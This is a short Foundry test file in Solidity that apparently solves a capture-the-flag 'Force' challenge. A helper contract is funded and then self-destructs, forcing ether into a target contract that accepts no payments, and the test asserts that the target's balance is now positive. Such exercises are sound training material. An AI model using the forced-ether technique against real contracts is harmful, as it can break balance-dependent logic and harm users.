// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Force} from "../src/force/Force.sol";
import {ForceHelper} from "../src/force/ForceHelper.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";


contract ForceTest is Test {
    Force public sc;
    ForceHelper public scHelper;

    function setUp() public {
        sc = new Force();
        scHelper = new ForceHelper();
        (bool success, bytes memory _msg) = address(scHelper).call{value: 100}("");
        if(!success) {
            bytes memory revertReason;
            assembly {
                revertReason := add(_msg, 68)
            }
            revert(string(revertReason));
        }

        assertGt(address(scHelper).balance, 0);
        assertEq(address(sc).balance, 0);
    }

    function test_Hack() public {
        scHelper.destruct(payable(address(sc)));
        assertGt(address(sc).balance, 0);
    }
}
